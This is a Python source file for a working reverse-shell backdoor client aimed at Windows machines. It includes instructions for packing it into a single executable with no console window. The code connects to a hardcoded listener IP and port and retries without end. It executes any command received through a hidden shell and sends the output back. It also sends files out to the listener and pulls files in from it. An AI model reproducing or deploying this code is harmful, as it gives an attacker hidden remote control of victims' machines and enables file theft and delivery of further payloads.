# Install pyinstaller on windows machineand run the following command
# pyinstaller <python file> --onefile --noconsole
import socket
import time
import json
import subprocess
import os


def download_file(file):
    f = open(file, "wb")
    s.settimeout(5)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def upload_file(file):
    f = open(file, "rb")
    s.send(f.read())
    f.close()


def reliable_send(dataa):
    jsondata = json.dumps(dataa)
    s.send(jsondata.encode())
    # in python3 we must encode the data before sending it


def reliable_recieve():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# both send and recieve are same as in server

# this shell() will execute commands on the target machine


def shell():
    while True:
        command = reliable_recieve()
        if (
            command == "quit"
            or command == "exit"
            or command == "bye"
            or command == "deactivate"
            or command == "logout"
        ):
            break
        elif command == "clear" or command == "cls":
            pass
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:8] == "download":
            upload_file(command[9:])
        elif command[:6] == "upload":
            download_file(command[7:])
        else:
            # here execute the command
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            result = execute.stdout.read() + execute.stderr.read()
            # once we perform above 2 lines we already get encoded data hence decoding
            result = result.decode()
            reliable_send(result)


# this function is called to establish the connection


def connection():
    time.sleep(5)
    try:
        # s.connect(('listener IP', '5555'))
        s.connect(("172.16.222.86", 5555))
        # this connect method requires the ip address and port no to connect
        shell()
        s.close()
    except:
        connection()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# to connect the listener we wont use use .connect method here
# but use connection function
connection()
